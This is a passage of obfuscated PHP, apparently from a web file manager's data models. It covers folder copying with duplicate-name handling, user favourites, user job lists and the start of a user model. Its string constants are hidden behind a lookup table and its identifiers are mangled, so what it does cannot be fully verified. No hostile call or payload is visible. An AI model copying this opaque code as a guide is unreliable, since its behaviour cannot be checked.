Model($fŠ£„ÇÓŒÛ[527])->addAll($Eƒ»ºì¹ïÜ[$fŠ£„ÇÓŒÛ[525]], array(), !0); Model($fŠ£„ÇÓŒÛ[528])->eventCopy($b‚ƒìåÏ®ç); $this->saveAll($Eƒ»ºì¹ïÜ[$fŠ£„ÇÓŒÛ[526]]); goto CÛ„§­¦ÄÃ; bâ‰§Ò­: Hook::trigger($fŠ£„ÇÓŒÛ[562]); if ($b‚ƒìåÏ®ç) { $this->folderSizeResetChildren($b‚ƒìåÏ®ç); } $this->_childrenListClear(); goto fÜšâÖè‰ª; b™¡Ğ¯Ğ¢ò: $fŠ£„ÇÓŒÛ =& $_SERVER[Â€Á›¨õ]; $Eƒ»ºì¹ïÜ = array($fŠ£„ÇÓŒÛ[525] => array(), $fŠ£„ÇÓŒÛ[526] => array(), $fŠ£„ÇÓŒÛ[524] => array(), $fŠ£„ÇÓŒÛ[560] => array()); $Bµ–ÔÃ = $c•°Àïîˆ† ? $c•°Àïîˆ† : $CêÈİåøƒ->pathThis($F³¯³‹¤Á); goto DŒ¶ˆ”îË; E»øòè×ˆ: $this->updateModifyTime($Bà¦Ø‘ÏÚí); return $b‚ƒìåÏ®ç; goto D‡ÔÎöÁîì; CÛ„§­¦ÄÃ: Model($fŠ£„ÇÓŒÛ[444])->linkAdd($Eƒ»ºì¹ïÜ[$fŠ£„ÇÓŒÛ[524]]); Model($fŠ£„ÇÓŒÛ[444])->remove($Eƒ»ºì¹ïÜ[$fŠ£„ÇÓŒÛ[560]]); $this->folderSizeReset($Bà¦Ø‘ÏÚí); goto E»øòè×ˆ; Aš„ñ–»: if ($AÄÒÂ¾Öö¼) { $this->_childrenAllMake($AÄÒÂ¾Öö¼); } Hook::trigger($fŠ£„ÇÓŒÛ[561]); $this->_copyChildTo($CêÈİåøƒ, $F³¯³‹¤Á, $b‚ƒìåÏ®ç, $f˜ŞİÖ›µ°, $Eƒ»ºì¹ïÜ, $D¨Á°óÉÇ¿); goto bâ‰§Ò­; DŒ¶ˆ”îË: $AÄÒÂ¾Öö¼ = $this->fileNameExist($Bà¦Ø‘ÏÚí, $Bµ–ÔÃ); $b‚ƒìåÏ®ç = $this->mkdir($Bà¦Ø‘ÏÚí, $Bµ–ÔÃ, $f˜ŞİÖ›µ°); if (!$AÄÒÂ¾Öö¼ || $f˜ŞİÖ›µ° == REPEAT_RENAME_FOLDER) { $f˜ŞİÖ›µ° = !1; } goto Aš„ñ–»; D‡ÔÎöÁîì: } private function _copyChildTo($dî‰öùõ¼¨, $eÜáËõ‚Áì, $FøĞ¢Ù£ë±, $fªœ ó‰†™, &$DËæ†Ò„, $b‚ˆéˆæô¡) { goto E¿½ÉçÅš©; E¿½ÉçÅš©: $B§ÔìÎÑ÷ =& $_SERVER[Â€Á›¨õ]; $EŒêÏùÍö = $this->sourceInfoCache($FøĞ¢Ù£ë±); $fÌÛ×ó‰’Ñ = $dî‰öùõ¼¨->listPath($eÜáËõ‚Áì); goto b–ò¥Ö¿¼Ì; b–ò¥Ö¿¼Ì: $a¦²ƒ¹Ôæ÷ = array_merge($fÌÛ×ó‰’Ñ[$B§ÔìÎÑ÷[73]], $fÌÛ×ó‰’Ñ[$B§ÔìÎÑ÷[74]]); $cĞŠŒÚÉî¿ = $this->_addFiles($dî‰öùõ¼¨, $fÌÛ×ó‰’Ñ[$B§ÔìÎÑ÷[73]], $b‚ˆéˆæô¡); $DÅ½š›¾ŞĞ = array(); goto eŒ×’¼‘ï÷; CƒŒ¢¨§®: $eêèŠ‰Ç¨‰ = $this->_childrenList($FøĞ¢Ù£ë±); $eêèŠ‰Ç¨‰ = array_to_keyvalue($eêèŠ‰Ç¨‰, $B§ÔìÎÑ÷[28]); foreach ($a¦²ƒ¹Ôæ÷ as $a©Ïï™âÂ¸) { $aÙ»ÇÎ™” = $eêèŠ‰Ç¨‰[$a©Ïï™âÂ¸[$B§ÔìÎÑ÷[28]]]; $C—Ğ¾¦õÍ˜ = $aÙ»ÇÎ™”[$B§ÔìÎÑ÷[390]]; $this->_copyApplyMeta($aÙ»ÇÎ™”, $DËæ†Ò„); if ($a©Ïï™âÂ¸[$B§ÔìÎÑ÷[29]] == $B§ÔìÎÑ÷[76]) { $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[75]] = $dî‰öùõ¼¨->getPathInner($a©Ïï™âÂ¸[$B§ÔìÎÑ÷[75]]); $this->_copyChildTo($dî‰öùõ¼¨, $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[75]], $C—Ğ¾¦õÍ˜, $fªœ ó‰†™, $DËæ†Ò„, $b‚ˆéˆæô¡); } } goto e÷ñ®çÅ‡›; eŒ×’¼‘ï÷: foreach ($a¦²ƒ¹Ôæ÷ as &$a©Ïï™âÂ¸) { goto CôŠ»İ†±°; cÚ­¬…Ö: if ($fªœ ó‰†™) { $e‡Î÷¶»ôé = $this->fileNameExistCache($FøĞ¢Ù£ë±, $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[28]]); if ($e‡Î÷¶»ôé) { if ($a©Ïï™âÂ¸[$B§ÔìÎÑ÷[397]] || $fªœ ó‰†™ == REPEAT_SKIP) { continue; } if ($fªœ ó‰†™ == REPEAT_REPLACE) { $aÙ»ÇÎ™” = $this->sourceInfoCache($e‡Î÷¶»ôé); $d‚‰¬‹ µ = $this->fileHistory($aÙ»ÇÎ™”, $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[441]], $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[77]]); if ($d‚‰¬‹ µ) { $DËæ†Ò„[$B§ÔìÎÑ÷[524]][] = $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[441]]; } continue; } else { if ($fªœ ó‰†™ == REPEAT_RENAME) { $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[28]] = $this->fileNameAutoCache($FøĞ¢Ù£ë±, $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[28]], $fªœ ó‰†™, !1); } } } } if (!$a©Ïï™âÂ¸[$B§ÔìÎÑ÷[397]] && $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[441]]) { $DËæ†Ò„[$B§ÔìÎÑ÷[524]][] = $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[441]]; } $DÅ½š›¾ŞĞ[] = $this->_makeItemData($a©Ïï™âÂ¸, $EŒêÏùÍö, $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[28]]); goto c‘ñ‘¾™Ÿ†; CôŠ»İ†±°: if (isset($cĞŠŒÚÉî¿[$a©Ïï™âÂ¸[$B§ÔìÎÑ÷[28]]])) { $a©Ïï™âÂ¸ = $cĞŠŒÚÉî¿[$a©Ïï™âÂ¸[$B§ÔìÎÑ÷[28]]]; } $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[397]] = $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[29]] == $B§ÔìÎÑ÷[76]; $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[399]] = _get($a©Ïï™âÂ¸, $B§ÔìÎÑ÷[167], $B§ÔìÎÑ÷[33]); goto F¤’¨„¼ó‘; F¤’¨„¼ó‘: $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[77]] = _get($a©Ïï™âÂ¸, $B§ÔìÎÑ÷[77], 0); $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[441]] = _get($a©Ïï™âÂ¸, $B§ÔìÎÑ÷[441], 0); if (!isset($a©Ïï™âÂ¸[$B§ÔìÎÑ÷[563]]) && $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[441]]) { $DËæ†Ò„[$B§ÔìÎÑ÷[560]][] = $a©Ïï™âÂ¸[$B§ÔìÎÑ÷[441]]; } goto cÚ­¬…Ö; c‘ñ‘¾™Ÿ†: } unset($a©Ïï™âÂ¸); if (!empty($DÅ½š›¾ŞĞ)) { $this->addAll($DÅ½š›¾ŞĞ); $this->_childrenListSelect($FøĞ¢Ù£ë±); } goto CƒŒ¢¨§®; e÷ñ®çÅ‡›: } private function _addFiles($E±øôÁïêæ, $B‚äóÂƒáô, $fâ™’©©Í) { goto fÑ±‹çäè¬; Bóïƒ³”×Ó: $d¯•Ê¾ëÁË = $d¯•Ê¾ëÁË ? $d¯•Ê¾ëÁË : array(); foreach ($d¯•Ê¾ëÁË as $B¨íˆ½Àéç) { if (!isset($eğ¥·´òø[$B¨íˆ½Àéç[$B†°’¬å‹[169]]])) { continue; } $bÛ÷¯éÚŠ =& $eğ¥·´òø[$B¨íˆ½Àéç[$B†°’¬å‹[169]]]; foreach ($bÛ÷¯éÚŠ as &$bùœä÷Ş³) { $bùœä÷Ş³[$B†°’¬å‹[441]] = $B¨íˆ½Àéç[$B†°’¬å‹[441]]; } unset($bùœä÷Ş³); } $f±·Äã¥Ûš = array(); goto e„Ú ‹Ëª¨; fÑ±‹çäè¬: $B†°’¬å‹ =& $_SERVER[Â€Á›¨õ]; if (!$B‚äóÂƒáô || count($B‚äóÂƒáô) == 0) { return array(); } $eğ¥·´òø = array(); goto F’äÚÉªµ‘; f†»æä‚µë: foreach ($d¯•Ê¾ëÁË as $B¨íˆ½Àéç) { if (!isset($eğ¥·´òø[$B¨íˆ½Àéç[$B†°’¬å‹[169]]])) { continue; } $AİÉ„‹ïË = $eğ¥·´òø[$B¨íˆ½Àéç[$B†°’¬å‹[169]]]; foreach ($AİÉ„‹ïË as &$bùœä÷Ş³) { $bùœä÷Ş³[$B†°’¬å‹[441]] = $B¨íˆ½Àéç[$B†°’¬å‹[441]]; $bùœä÷Ş³[$B†°’¬å‹[563]] = !0; } unset($bùœä÷Ş³); } $E‚ºäæï»™ = array(); foreach ($B‚äóÂƒáô as $a‚‚×½¯«ù) { if (isset($a‚‚×½¯«ù[$B†°’¬å‹[563]]) && $a‚‚×½¯«ù[$B†°’¬å‹[563]]) { continue; } $CƒÏîÊìùŒ = $E±øôÁïêæ->getPathInner($a‚‚×½¯«ù[$B†°’¬å‹[75]]); $c“—¸Èõ¥æ = $AÅßÃÓœº->addFileMake($CƒÏîÊìùŒ, $a‚‚×½¯«ù[$B†°’¬å‹[77]], $a‚‚×½¯«ù[$B†°’¬å‹[170]], $a‚‚×½¯«ù[$B†°’¬å‹[169]], $a‚‚×½¯«ù[$B†°’¬å‹[28]], $fâ™’©©Í); $E‚ºäæï»™[] = $c“—¸Èõ¥æ; } goto a¯ÂÕœ‚ç²; e„Ú ‹Ëª¨: foreach ($B‚äóÂƒáô as $E­‚â÷ñ–) { $f±·Äã¥Ûš[$E­‚â÷ñ–[$B†°’¬å‹[28]]] = $E­‚â÷ñ–; } return $f±·Äã¥Ûš; goto f•„®‚—˜à; a¯ÂÕœ‚ç²: $AÅßÃÓœº->addAll($E‚ºäæï»™); $b®¦ìÀÑ¯Ø = array($B†°’¬å‹[169] => array($B†°’¬å‹[7], array_keys($eğ¥·´òø))); $d¯•Ê¾ëÁË = $AÅßÃÓœº->where($b®¦ìÀÑ¯Ø)->select(); goto Bóïƒ³”×Ó; F’äÚÉªµ‘: foreach ($B‚äóÂƒáô as &$bùœä÷Ş³) { goto föÌ÷éæİç; cÌ˜ŠéÇ•¶: if (count($eğ¥·´òø[$Aáœ¹Ç™ƒÙ]) > 1) { $bùœä÷Ş³[$B†°’¬å‹[563]] = !0; } goto aÈÁ‹½ğª; dšÏŒ§ÙÙø: $Aáœ¹Ç™ƒÙ = $E±øôÁïêæ->hashMd5($bùœä÷Ş³[$B†°’¬å‹[75]]); if (strlen($Aáœ¹Ç™ƒÙ) > 10 && !isset($eğ¥·´òø[$Aáœ¹Ç™ƒÙ])) { $eğ¥·´òø[$Aáœ¹Ç™ƒÙ] = array(); } $bùœä÷Ş³[$B†°’¬å‹[170]] = $e±‡Ò†è¡; goto A¿í§Ÿ˜Øì; föÌ÷éæİç: Hook::trigger($B†°’¬å‹[564], $bùœä÷Ş³); $bùœä÷Ş³[$B†°’¬å‹[75]] = $E±øôÁïêæ->getPathInner($bùœä÷Ş³[$B†°’¬å‹[75]]); $e±‡Ò†è¡ = $E±øôÁïêæ->hashSimple($bùœä÷Ş³[$B†°’¬å‹[75]]); goto dšÏŒ§ÙÙø; A¿í§Ÿ˜Øì: $bùœä÷Ş³[$B†°’¬å‹[169]] = $Aáœ¹Ç™ƒÙ; Hook::trigger($B†°’¬å‹[565], $bùœä÷Ş³); $eğ¥·´òø[$Aáœ¹Ç™ƒÙ][] =& $bùœä÷Ş³; goto cÌ˜ŠéÇ•¶; aÈÁ‹½ğª: } unset($bùœä÷Ş³); $b®¦ìÀÑ¯Ø = array($B†°’¬å‹[169] => array($B†°’¬å‹[7], array_keys($eğ¥·´òø))); goto b£Ò“¹µ•; b£Ò“¹µ•: $AÅßÃÓœº = Model($B†°’¬å‹[566]); $d¯•Ê¾ëÁË = $AÅßÃÓœº->where($b®¦ìÀÑ¯Ø)->select(); $d¯•Ê¾ëÁË = $d¯•Ê¾ëÁË ? $d¯•Ê¾ëÁË : array(); goto f†»æä‚µë; f•„®‚—˜à: } } define($_SERVER[Â€Á›¨õ][567], $_SERVER[Â€Á›¨õ][568]); goto aÜ×È‡´É; aÕ‘­ÁÅ±™: class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\166"; protected function cacheFunctionAlias($EÊ… ç¶–) { $e±ÍË¦ò¨¿ =& $_SERVER[Â€Á›¨õ]; return array($e±ÍË¦ò¨¿[1767] => array(USER_ID, $e±ÍË¦ò¨¿[2080])); } protected function listData() { $f›’Äİáê =& $_SERVER[Â€Á›¨õ]; $E›‰öò±Ö = array($f›’Äİáê[1493] => USER_ID, $f›’Äİáê[457] => 0); $CË‘İãßË = $f›’Äİáê[2081]; $bĞ¤‰Œ—Æ = $this->field($CË‘İãßË)->where($E›‰öò±Ö)->order($f›’Äİáê[2082])->select(); return $bĞ¤‰Œ—Æ ? $bĞ¤‰Œ—Æ : array(); } protected function resetCache() { } protected function listView() { goto E‰½éİİÚ‚; E‰½éİİÚ‚: $aÏ¦¤ŸÉ›Å =& $_SERVER[Â€Á›¨õ]; $A‘»½¿ÖÇÎ = $this->listData(); $E’œêµŞŸ¶ = array_filter_by_field($A‘»½¿ÖÇÎ, $aÏ¦¤ŸÉ›Å[29], $aÏ¦¤ŸÉ›Å[403]); goto AªÍÕ“’İÓ; aåå†›ÄÓ: $BÏïÇµÅÈ© = array($aÏ¦¤ŸÉ›Å[404] => array($aÏ¦¤ŸÉ›Å[405], $c©’‰¶à¶Ç)); $d¦õ¬Ã…¾í = Model($aÏ¦¤ŸÉ›Å[767])->listSource($BÏïÇµÅÈ©, $dŸ‰ä†‡¶Ë); $d¦õ¬Ã…¾í = array_merge($d¦õ¬Ã…¾í[$aÏ¦¤ŸÉ›Å[73]], $d¦õ¬Ã…¾í[$aÏ¦¤ŸÉ›Å[74]]); goto aš´Ù…çÏ; aš´Ù…çÏ: $d¦õ¬Ã…¾í = array_to_keyvalue($d¦õ¬Ã…¾í, $aÏ¦¤ŸÉ›Å[390]); foreach ($A‘»½¿ÖÇÎ as $AöÏÖÇÇ«ù => $dİÛ‹“£‰) { $dœùÃö–Çƒ = $d¦õ¬Ã…¾í[$dİÛ‹“£‰[$aÏ¦¤ŸÉ›Å[75]]]; $dœùÃö–Çƒ = $dœùÃö–Çƒ ? $dœùÃö–Çƒ : array(); $A‘»½¿ÖÇÎ[$AöÏÖÇÇ«ù] = array_merge($dœùÃö–Çƒ, $dİÛ‹“£‰); } return $A‘»½¿ÖÇÎ; goto fÉ†Ôã«; AªÍÕ“’İÓ: $c©’‰¶à¶Ç = array_to_keyvalue($E’œêµŞŸ¶, $aÏ¦¤ŸÉ›Å[33], $aÏ¦¤ŸÉ›Å[75]); if (!$c©’‰¶à¶Ç) { return $A‘»½¿ÖÇÎ; } $dŸ‰ä†‡¶Ë = 2000; goto aåå†›ÄÓ; fÉ†Ôã«: } protected function addFav($c³ÕÑùøò, $C™¬Á·ÎŞ = '', $D¾õŒğ•¡ = "\163\157\165\x72\x63\145") { goto cš“¢ÇÒ¦; B§ÛøáÃ×Ó: if (!$C™¬Á·ÎŞ && $D¾õŒğ•¡ == $b’Ö“‘ïâê[403]) { $a‰Ú‰Ùí¯ç = Model($b’Ö“‘ïâê[1178])->where(array($b’Ö“‘ïâê[404] => $c³ÕÑùøò))->find(); if (!$a‰Ú‰Ùí¯ç) { return !1; } $C™¬Á·ÎŞ = $a‰Ú‰Ùí¯ç[$b’Ö“‘ïâê[28]]; } $C™¬Á·ÎŞ = $this->getAutoName($C™¬Á·ÎŞ); $C½ “ÙÀà… = array($b’Ö“‘ïâê[1493] => USER_ID, $b’Ö“‘ïâê[457] => 0, $b’Ö“‘ïâê[407] => $C™¬Á·ÎŞ, $b’Ö“‘ïâê[408] => $c³ÕÑùøò, $b’Ö“‘ïâê[409] => $D¾õŒğ•¡, $b’Ö“‘ïâê[1668] => $DÆ¤Ã¤­óî + 1); goto Dêˆ¡ÇÁŒù; cš“¢ÇÒ¦: $b’Ö“‘ïâê =& $_SERVER[Â€Á›¨õ]; $eÆÚò³… = array($b’Ö“‘ïâê[1493] => USER_ID, $b’Ö“‘ïâê[457] => 0, $b’Ö“‘ïâê[409] => $D¾õŒğ•¡, $b’Ö“‘ïâê[408] => $c³ÕÑùøò); if ($this->where($eÆÚò³…)->find()) { return !1; } goto aÖ”ßö†„¹; Dêˆ¡ÇÁŒù: return $this->add($C½ “ÙÀà…); goto A¢ïÌÍ»Úø; aÖ”ßö†„¹: $eÆÚò³… = array($b’Ö“‘ïâê[1493] => USER_ID, $b’Ö“‘ïâê[457] => 0); $DÆ¤Ã¤­óî = $this->where($eÆÚò³…)->max($b’Ö“‘ïâê[1687]); if (!$DÆ¤Ã¤­óî) { $DÆ¤Ã¤­óî = 0; } goto B§ÛøáÃ×Ó; A¢ïÌÍ»Úø: } protected function remove($Dë¥›¿¯) { $fŠ­ò×Šô¨ =& $_SERVER[Â€Á›¨õ]; $a¤¨„­Í»Ï = array($fŠ­ò×Šô¨[1493] => USER_ID, $fŠ­ò×Šô¨[406] => $Dë¥›¿¯); return $this->where($a¤¨„­Í»Ï)->delete(); } protected function removeByName($E‡Ì†î„ÙÅ) { $BÜè£“òÚ¯ =& $_SERVER[Â€Á›¨õ]; $dÜ¦äÕ˜Æ = array($BÜè£“òÚ¯[1493] => USER_ID, $BÜè£“òÚ¯[407] => $E‡Ì†î„ÙÅ, $BÜè£“òÚ¯[457] => 0); return $this->where($dÜ¦äÕ˜Æ)->delete(); } protected function rename($f•ÇÃ¦ŠÑŒ, $DÅĞÕ¥…âƒ) { $E‘¯·ï˜ìí =& $_SERVER[Â€Á›¨õ]; if ($f•ÇÃ¦ŠÑŒ == $DÅĞÕ¥…âƒ) { return !1; } $eöñ—ÏĞôä = $this->getAutoName($DÅĞÕ¥…âƒ); if ($DÅĞÕ¥…âƒ != $eöñ—ÏĞôä) { return !1; } $Fµ‡áî¿×º = array($E‘¯·ï˜ìí[1493] => USER_ID, $E‘¯·ï˜ìí[457] => 0, $E‘¯·ï˜ìí[28] => $f•ÇÃ¦ŠÑŒ); return $this->where($Fµ‡áî¿×º)->save(array($E‘¯·ï˜ìí[28] => $DÅĞÕ¥…âƒ)); } protected function resetSort($A”’õõöùØ) { $cî©ãÓ˜Ğ =& $_SERVER[Â€Á›¨õ]; $A”’õõöùØ = is_array($A”’õõöùØ) ? $A”’õõöùØ : array(); $fËîç‡èˆ˜ = array($cî©ãÓ˜Ğ[1493] => USER_ID); for ($cˆİ‡õ‘„ß = 0; $cˆİ‡õ‘„ß < count($A”’õõöùØ); $cˆİ‡õ‘„ß++) { $fËîç‡èˆ˜[$cî©ãÓ˜Ğ[406]] = $A”’õõöùØ[$cˆİ‡õ‘„ß]; $this->where($fËîç‡èˆ˜)->save(array($cî©ãÓ˜Ğ[1668] => $cˆİ‡õ‘„ß + 1)); } return !0; } protected function moveTop($aéáÍ“ßñ) { goto BšÍØğÄŞ´; Có§„­†›: return $this->resetSort($b˜£¿óí¿‡); goto E»ÊÛÀ‘•¬; Aª¦³¸†˜: $d¾¾Ò¸³¬¾ = $b˜£¿óí¿‡; $b˜£¿óí¿‡ = array_remove_value($b˜£¿óí¿‡, $F½„Ï°ª…[$E§áÕó ºß[388]]); array_unshift($b˜£¿óí¿‡, $F½„Ï°ª…[$E§áÕó ºß[388]]); goto Có§„­†›; C¨…Œº´: if (!$F½„Ï°ª…) { return; } $b˜£¿óí¿‡ = $this->field($E§áÕó ºß[388])->where($Bğà‘Ö›ïÆ)->order($E§áÕó ºß[2082])->select(); $b˜£¿óí¿‡ = array_to_keyvalue($b˜£¿óí¿‡, $E§áÕó ºß[33], $E§áÕó ºß[388]); goto Aª¦³¸†˜; BšÍØğÄŞ´: $E§áÕó ºß =& $_SERVER[Â€Á›¨õ]; $Bğà‘Ö›ïÆ = array($E§áÕó ºß[1493] => USER_ID, $E§áÕó ºß[457] => 0); $F½„Ï°ª… = $this->where($Bğà‘Ö›ïÆ)->where(array($E§áÕó ºß[28] => $aéáÍ“ßñ))->find(); goto C¨…Œº´; E»ÊÛÀ‘•¬: } protected function moveBottom($d‹ÃÚÀá) { $Cí¹‰ğ„öÌ =& $_SERVER[Â€Á›¨õ]; $CÙˆµ”†õ = array($Cí¹‰ğ„öÌ[1493] => USER_ID, $Cí¹‰ğ„öÌ[457] => 0); $bë¨î…Ùâ´ = $this->where($CÙˆµ”†õ)->max($Cí¹‰ğ„öÌ[1687]); $B¶×•Ãš§‰ = array($Cí¹‰ğ„öÌ[1687] => $bë¨î…Ùâ´ + 1); return $this->where($CÙˆµ”†õ)->where(array($Cí¹‰ğ„öÌ[28] => $d‹ÃÚÀá))->save($B¶×•Ãš§‰); } private function getAutoName($a¾º µ¹«ª) { goto eÒéÆÉ‚½…; eÒéÆÉ‚½…: $bÜïôƒÏ°á =& $_SERVER[Â€Á›¨õ]; $fÇé…““ƒ‡ = array($bÜïôƒÏ°á[1493] => USER_ID, $bÜïôƒÏ°á[457] => 0); $Få“Øî½–ê = $this->field($bÜïôƒÏ°á[28])->where($fÇé…““ƒ‡)->select(); goto F–öêÀæ™; F–öêÀæ™: $Få“Øî½–ê = array_to_keyvalue($Få“Øî½–ê, $bÜïôƒÏ°á[33], $bÜïôƒÏ°á[28]); if (!$Få“Øî½–ê || !in_array($a¾º µ¹«ª, $Få“Øî½–ê)) { return $a¾º µ¹«ª; } for ($eœàÇ²ª„ = 0; $eœàÇ²ª„ < count($Få“Øî½–ê); $eœàÇ²ª„++) { if (!in_array($a¾º µ¹«ª . "\x28{$eœàÇ²ª„}\51", $Få“Øî½–ê)) { return $a¾º µ¹«ª . "\50{$eœàÇ²ª„}\51"; } } goto fëµÛõ‡àÍ; fëµÛõ‡àÍ: return $a¾º µ¹«ª . "\x28{$eœàÇ²ª„}\x29"; goto eùÈ¿ëÂìá; eùÈ¿ëÂìá: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\152\157\x62\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\144\x65\163\x63", "\x73\157\x72\164"); const JOB_KEY = "\163\145\x6c\x66\112\x6f\x62\x4c\x69\163\x74"; public function listData($f‘×â¿™ÌŠ = false, $AÊœáä‰ìÄ = "\x73\157\x72\x74", $BÄôÂìÆŞ = false) { return parent::listData($f‘×â¿™ÌŠ, $AÊœáä‰ìÄ, $BÄôÂìÆŞ); } public function remove($BñóÂŠÇŠ) { return parent::remove($BñóÂŠÇŠ); } public function add($BôøÍä‘Ä) { $a…õèµ´Ì =& $_SERVER[Â€Á›¨õ]; if ($this->findByName($BôøÍä‘Ä[$a…õèµ´Ì[28]])) { return !1; } $BôøÍä‘Ä[$a…õèµ´Ì[1687]] = $this->getSort(); return parent::insert($BôøÍä‘Ä); } private function getSort() { $aîÀÂÛ²…î =& $_SERVER[Â€Á›¨õ]; $D×Ü ïáäó = parent::listData(); $D—äÓ×ßåç = array_to_keyvalue($D×Ü ïáäó, $aîÀÂÛ²…î[33], $aîÀÂÛ²…î[1687]); return empty($D—äÓ×ßåç) ? 0 : max($D—äÓ×ßåç) + 1; } public function update($aå†ñòÛÍÎ, $eÄáå‘£®Ñ) { $C®ÊÊÇ¯á• =& $_SERVER[Â€Á›¨õ]; $e¤¹¨¿î†¸ = parent::listData($aå†ñòÛÍÎ); $a‹º¨Ä‡â = $this->findByName($eÄáå‘£®Ñ[$C®ÊÊÇ¯á•[28]]); if (!$e¤¹¨¿î†¸ || $a‹º¨Ä‡â && $a‹º¨Ä‡â[$C®ÊÊÇ¯á•[388]] != $e¤¹¨¿î†¸[$C®ÊÊÇ¯á•[388]]) { return !1; } return parent::update($aå†ñòÛÍÎ, $eÄáå‘£®Ñ); } public function setUserJob($få²šòĞ, $e¶ïå¦º«) { goto cíìİ‚¼Ô“; AÈ§ùá£ïµ: $b˜ˆ˜‰‡·÷ = rtrim($b˜ˆ˜‰‡·÷, $CãÊ‘ãÌš™[47]); Model($CãÊ‘ãÌš™[501])->metaSet($få²šòĞ, self::JOB_KEY, $b˜ˆ˜‰‡·÷); goto Eµ¡éäÕ½; cíìİ‚¼Ô“: $CãÊ‘ãÌš™ =& $_SERVER[Â€Á›¨õ]; if (!is_array($e¶ïå¦º«)) { $e¶ïå¦º« = array($e¶ïå¦º«); } $C£§™Ï¹ˆì = parent::listData(); goto AÑ¸‡…²¦; AÑ¸‡…²¦: $DİÊ¡ì‡š = array_to_keyvalue($C£§™Ï¹ˆì, $CãÊ‘ãÌš™[28]); $b˜ˆ˜‰‡·÷ = $CãÊ‘ãÌš™[373]; foreach ($e¶ïå¦º« as $Fã‚ˆ¾•ÚÄ) { if ($DİÊ¡ì‡š[$Fã‚ˆ¾•ÚÄ]) { $b˜ˆ˜‰‡·÷ .= $DİÊ¡ì‡š[$Fã‚ˆ¾•ÚÄ][$CãÊ‘ãÌš™[388]] . $CãÊ‘ãÌš™[47]; } else { $CÀ—¢…½Äí = $this->add($Fã‚ˆ¾•ÚÄ); $b˜ˆ˜‰‡·÷ .= $CÀ—¢…½Äí . $CãÊ‘ãÌš™[47]; } } goto AÈ§ùá£ïµ; Eµ¡éäÕ½: } public function getUserJob($C´Ê‹‡‰ª¡) { $CÂ•´£¥¡İ = Model($_SERVER[Â€Á›¨õ][501])->metaGet($C´Ê‹‡‰ª¡); return $this->getUserJobInfo($CÂ•´£¥¡İ[self::JOB_KEY]); } public function getUserJobInfo($EÄŠÙÒ„¬°) { goto eŒˆå•³™Ë; eŒˆå•³™Ë: $c«¯ãºåé =& $_SERVER[Â€Á›¨õ]; $Aæ­î¼‚ = explode($c«¯ãºåé[47], $EÄŠÙÒ„¬°); $eùï¦ÓÈ’ = parent::listData(); goto f®ø­ŠËÊ¥; f®ø­ŠËÊ¥: $eùï¦ÓÈ’ = array_remove_key($eùï¦ÓÈ’, $c«¯ãºåé[192]); $f…®è‹íó = array(); foreach ($Aæ­î¼‚ as $d™¥À´Ûµá) { if (isset($eùï¦ÓÈ’[$d™¥À´Ûµá])) { $f…®è‹íó[] = $eùï¦ÓÈ’[$d™¥À´Ûµá]; } } goto D •·ÎŒŠÅ; D •·ÎŒŠÅ: return $f…®è‹íó; goto eà“ Ã­Š ; eà“ Ã­Š : } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\141\x62\x6c\145\116\141\155\x65" => "\165\163\x65\162\137\x6d\145\164\141", "\x6d\x65\x74\x61\106\151\x65\154\144" => "\x75\x73\x65\x72\x49\104"); protected $simpleField = "\165\163\x65\162\x49\104\x2c\x6e\151\143\153\x4e\x61\x6d\x65\54\156\141\155\x65\x2c\141\x76\141\x74\x61\162\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ağØØó„¥) { $d…‰ï¦ÆæÑ =& $_SERVER[Â€Á›¨õ]; $C¸˜­´ª = $d…‰ï¦ÆæÑ[2083]; return array($d…‰ï¦ÆæÑ[1735] => array($ağØØó„¥[0], $C¸˜­´ª), $d…‰ï¦ÆæÑ[1737] => array($ağØØó„¥[0], $C¸˜­´ª), $d…‰ï¦ÆæÑ[2084] => array($ağØØó„¥[0], $C¸˜­´ª)); } protected function getInfo($C¤ÛÍ´âË, $Fì“…˜£îë = false) { $e×†¨ƒÉ‰´ = $this->getInfoSimple($C¤ÛÍ´âË); if (!is_array($e×†¨ƒÉ‰´)) { return array(); } if ($Fì“…˜£îë) { return $this->_getInfoApply($e×†¨ƒÉ‰´); } return $this->cacheFunctionGet($_SERVER[Â€Á›¨õ][1744], $C¤ÛÍ´âË); } protected function getInfoFull($dôçÂùÒ¬µ, $d–Š‚ŞÊÑ = false) { $cØâ¾¡¹ = $this->getInfoSimple($dôçÂùÒ¬µ); if (!is_array($cØâ¾¡¹)) { return array(); } if ($d–Š‚ŞÊÑ) { return $this->_getInfoApply($cØâ¾¡¹, !0); return $this->_getInfoApply($cØâ¾¡¹, !0); } return $this->cacheFunctionGet($_SERVER[Â€Á›¨õ][2085], $dôçÂùÒ¬µ); } private function _getInfoApply($cÌšèãœ¦ä, $cğÕ¿á¡‘´ = false) { goto A§ÖÄé‚¬Í; A§ÖÄé‚¬Í: $Bï ôŸøô„ =& $_SERVER[Â€Á›¨õ]; if (!$cÌšèãœ¦ä) { return $cÌšèãœ¦ä; } $Bâ†ßäÒòÅ = md5($Bï ôŸøô„[2086] . $cÌšèãœ¦ä[$Bï 